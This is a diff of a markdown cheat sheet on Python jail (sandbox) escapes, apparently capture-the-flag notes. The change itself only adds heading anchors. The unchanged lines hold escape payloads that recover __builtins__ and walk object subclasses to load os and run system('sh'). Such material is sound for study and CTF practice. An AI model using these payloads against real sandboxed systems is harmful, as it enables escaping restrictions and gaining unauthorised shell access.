@@ -2,7 +2,7 @@
 title: python jail bypass
 ---
 # pyjail
-## builtins
+## builtins {#builtins}
 ```python showLineNumbers
 # obtain builtins from a globally defined built-in functions
 # https://docs.python.org/3/library/functions.html
@@ -28,7 +28,7 @@ func.__globals__['__builtins__']
 (await _ for _ in ()).ag_frame.f_globals["__builtins__"]
 ```
 
-## subclasses
+## subclasses {#subclasses}
 ```python showLineNumbers
 # <class '_frozen_importlib.BuiltinImporter'>
 ().__class__.__mro__[1].__subclasses__()[104].load_module("os").system("sh");
